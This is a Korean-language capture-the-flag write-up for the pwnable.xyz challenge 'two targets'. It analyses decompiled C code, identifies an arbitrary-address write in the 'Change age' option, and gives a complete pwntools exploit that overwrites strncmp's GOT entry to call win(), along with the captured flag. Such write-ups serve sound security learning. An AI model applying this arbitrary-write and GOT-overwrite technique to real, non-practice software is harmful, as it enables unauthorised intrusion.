# [pwnable.xyz] two targets

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Which one would you exploit?
>
> Release: [two targets.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8935157/two.targets.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174476660-1c358469-4bf7-4541-a08f-bbece2b3f6ce.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

#### 1. Change name

```c
      if ( op != 1 )
        goto LABEL_14;
      printf("name: ");
      __isoc99_scanf("%32s", name);
```

`name`에 최대 32바이트까지 문자열을 입력할 수 있다.

#### 2. Change nationality

```c
      if ( op != 2 )
        break;
      printf("nationality: ");
      __isoc99_scanf("%24s", nationality);
```

`nationality`에 최대 24바이트까지 문자열을 입력할 수 있다.

#### 3. Change age

```c
      if ( op == 3 )
      {
        printf("age: ");
        __isoc99_scanf("%d", *(_QWORD *)&nationality[16]);
      }
```

`&nationality[16]`에 있는 8바이트 값을 주소로 받아서 `scanf()`로 정수를 입력받는다. 주소를 자유롭게 설정할 수 있기 때문에, 임의의 주소에 임의의 8바이트 값을 쓸 수 있다.

#### 4. Get shell

```c
      else if ( op == 4 )
      {
        if ( auth((__int64)name) )
          win();
      }
```

`auth(name)`의 반환값이 0이 아니면 `win()`을 호출한다.

```c
_BOOL8 __fastcall auth(__int64 name)
{
  signed int i; // [rsp+18h] [rbp-38h]
  char encodedName[8]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v4; // [rsp+28h] [rbp-28h]
  __int64 v5; // [rsp+30h] [rbp-20h]
  __int64 v6; // [rsp+38h] [rbp-18h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  *(_QWORD *)encodedName = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  for ( i = 0; (unsigned int)i <= 0x1F; ++i )
    encodedName[i] = ((*(_BYTE *)(name + i) >> 4) | (0x10 * *(_BYTE *)(name + i))) ^ *((_BYTE *)main + i);
  return strncmp(encodedName, &s2, 0x20uLL) == 0;
}
```

`auth()`는 인자로 받은 `name`을 인코딩해서 전역 변수 `s2`에 있는 문자열과 비교한다. 비교 결과가 같으면 1을 반환한다.

## Exploit

두 가지 방법으로 익스플로잇을 할 수 있다.

- `auth()`에서 인코딩을 거친 결과가 `s2`에 저장된 문자열과 같아지는 `name`을 찾아서 입력
- `3. Change age`의 AAW를 이용하여 GOT overwrite

덜 귀찮아 보이는 두 번째 방법을 선택하였다.

`strncmp()`의 GOT를 `win()`의 주소로 덮고 `auth()`를 실행하면 `strncmp()`가 호출되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30031)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40099c
strncmp_got = 0x603018

sla('> ', '2')
sla('nationality: ', b'a' * 0x10 + p64(strncmp_got))

sla('> ', '3')
sla('age: ', str(win))

sla('> ', '4')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to svc.pwnable.xyz on port 30031: Done
[*] Switching to interactive mode
FLAG{now_try_the_2nd_solution}FLAG{now_try_the_2nd_solution}
```
